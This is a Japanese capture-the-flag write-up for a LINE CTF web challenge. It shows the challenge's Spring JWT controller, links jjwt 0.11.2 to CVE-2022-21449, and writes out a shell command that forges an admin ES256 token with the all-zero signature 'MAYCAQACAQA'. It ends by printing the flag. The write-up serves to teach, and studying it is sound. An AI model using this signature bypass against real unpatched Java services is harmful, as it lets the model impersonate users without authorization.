# jalyboy-jalygirl:Web:100pts
It's almost spring. Do you like Java?  
[http://34.85.123.82:10001/](http://34.85.123.82:10001/)  

[jalyboy-jalygirl_2df1a2ce1e35d8c9cd97cf59436ec135.zip](jalyboy-jalygirl_2df1a2ce1e35d8c9cd97cf59436ec135.zip)  

# Solution
URLとソースが渡される。  
[jalyboy-baby](../jalyboy-baby)の続き問題のようだ。  
![site.png](site/site.png)  
URLクエリは以下であった。  
```
http://34.85.123.82:10001/?j=eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.QZcJ_5i4ODRj9Vzf0BOWCPlrg4vPaVQeFuKm6yTCxWj1NqK5icY9LdOr1i44AIeufkF9nW7NANjEZfrx3p2M9A
```
ソースの主要部分は以下のように変更されていた。  
```java
~~~
@Controller
public class JwtController {

    public static final String ADMIN = "admin";
    public static final String GUEST = "guest";
    public static final String UNKNOWN = "unknown";
    public static final String FLAG = System.getenv("FLAG");
    KeyPair keyPair = Keys.keyPairFor(SignatureAlgorithm.ES256);

    @GetMapping("/")
    public String index(@RequestParam(required = false) String j, Model model) {
        String sub = UNKNOWN;
        String jwt_guest = Jwts.builder().setSubject(GUEST).signWith(keyPair.getPrivate()).compact();

        try {
            Jws<Claims> jwt = Jwts.parser().setSigningKey(keyPair.getPublic()).parseClaimsJws(j);
            Claims claims = (Claims) jwt.getBody();
            if (claims.getSubject().equals(ADMIN)) {
                sub = ADMIN;
            } else if (claims.getSubject().equals(GUEST)) {
                sub = GUEST;
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }

        model.addAttribute("jwt", jwt_guest);
        model.addAttribute("sub", sub);
        if (sub.equals(ADMIN)) model.addAttribute("flag", FLAG);

        return "index";
    }
}
```
署名が検証されている。  
通常は改竄が不可能であるはずなので、既知の脆弱が怪しい。  
build.gradleを見ると以下の通りであった。  
```gradle
~~~
dependencies {
	implementation 'org.springframework.boot:spring-boot-starter-freemarker'
	implementation 'org.springframework.boot:spring-boot-starter-web'
	annotationProcessor 'org.springframework.boot:spring-boot-configuration-processor'
	testImplementation 'org.springframework.boot:spring-boot-starter-test'
	implementation 'io.jsonwebtoken:jjwt-api:0.11.2'
	runtimeOnly 'io.jsonwebtoken:jjwt-impl:0.11.2',
			// Uncomment the next line if you want to use RSASSA-PSS (PS256, PS384, PS512) algorithms:
			//'org.bouncycastle:bcprov-jdk15on:1.60',
			'io.jsonwebtoken:jjwt-jackson:0.11.2' // or 'io.jsonwebtoken:jjwt-gson:0.11.2' for gson
}
~~~
```
`jjwt`の`0.11.2`であることがわかる。  
「jjwt 0.11.2 CVE」とGoogle検索すると[JVM Vulnerabiliity CVE-2022-21449](https://github.com/jwtk/jjwt/issues/726)なるIssueが見つかる。  
[Release Notesの0.11.3](https://github.com/jwtk/jjwt/blob/master/CHANGELOG.md#0113)を見ると、報告者がLINEなので十中八九これだろう。  
署名を`MAYCAQACAQA`にするといいらしい。  
以下のように行う。  
```bash
$ # eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.QZcJ_5i4ODRj9Vzf0BOWCPlrg4vPaVQeFuKm6yTCxWj1NqK5icY9LdOr1i44AIeufkF9nW7NANjEZfrx3p2M9A
$ echo "eyJhbGciOiJFUzI1NiJ9.`echo -n '{ "sub": "admin" }' | base64`.MAYCAQACAQA"
eyJhbGciOiJFUzI1NiJ9.eyAic3ViIjogImFkbWluIiB9.MAYCAQACAQA
```
URLクエリに設定してアクセスする。  
![flag.png](site/flag.png)  
flagが得られた。  

## LINECTF{abaa4d1cb9870fd25776a81bbd278932}